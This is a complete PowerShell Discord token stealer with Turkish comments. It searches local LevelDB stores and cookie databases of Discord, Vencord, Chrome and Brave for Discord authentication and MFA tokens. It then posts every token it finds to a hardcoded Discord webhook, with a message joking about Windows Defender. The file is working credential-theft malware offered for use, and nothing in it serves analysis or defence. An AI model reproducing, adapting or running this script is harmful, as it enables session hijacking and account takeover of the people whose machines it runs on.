# sqlite3.exe dosyasının yolu (aynı dizinde olduğunu varsayıyoruz)
$sqliteExe = ".\sqlite3.exe"

# Tarama yapılacak LevelDB dizinleri
$paths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\Vencord\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
)

# Tarama yapılacak Cookie veritabanları (SQLite)
$cookiePaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
    "$env:APPDATA\discord\Cookies",
    "$env:APPDATA\discordcanary\Cookies",
    "$env:APPDATA\Vencord\Cookies"
)

$tokens = @()

function Get-TokensFromLevelDB {
    param ($path)
    if (Test-Path $path) {
        $files = Get-ChildItem -Path $path -Include *.ldb, *.log -Recurse -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            try {
                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                $matches = [regex]::Matches($content, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                foreach ($match in $matches) {
                    if (-not $tokens.Contains($match.Value)) {
                        $tokens += $match.Value
                    }
                }
            } catch {}
        }
    }
}

function Get-TokensFromSQLite {
    param ($dbPath)
    if ((Test-Path $dbPath) -and (Test-Path $sqliteExe)) {
        try {
            $tempDb = "$env:TEMP\cookies_temp.db"
            Copy-Item -Path $dbPath -Destination $tempDb -Force

            $query = "SELECT name, value FROM cookies WHERE name LIKE '%token%' OR value LIKE '%mfa.%';"
            $output = & $sqliteExe $tempDb "$query" 2>$null

            if ($output) {
                $lines = $output -split "`n"
                foreach ($line in $lines) {
                    $parts = $line -split '\|'
                    foreach ($part in $parts) {
                        $matches = [regex]::Matches($part, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                        foreach ($match in $matches) {
                            if (-not $tokens.Contains($match.Value)) {
                                $tokens += $match.Value
                            }
                        }
                    }
                }
            }

            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

# LevelDB'den tokenleri topla
foreach ($path in $paths) {
    Get-TokensFromLevelDB -path $path
}

# Cookie veritabanından tokenleri topla
foreach ($cookiePath in $cookiePaths) {
    Get-TokensFromSQLite -dbPath $cookiePath
}

# Token bulunduysa webhooka gönder
if ($tokens.Count -gt 0) {
    $joinedTokens = ($tokens -join ",")
    $body = @{
        content = "ıdk just to trigger windows defender lol $joinedTokens"
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1382366500777754786/sjFYA4Lh_9oTWZXM4L_ehRA7RagtJKDwxQ23xZT8-cUTYyQErTZWp-e977lclWd6PQX9" -Method Post -Body $body -ContentType "application/json"
    } catch {
        Write-Host "Webhook başarısız oldu, beceremedin beyin." -ForegroundColor Red
    }
} else {
    Write-Host "Token bulunamadı, mal." -ForegroundColor Red
}

pause
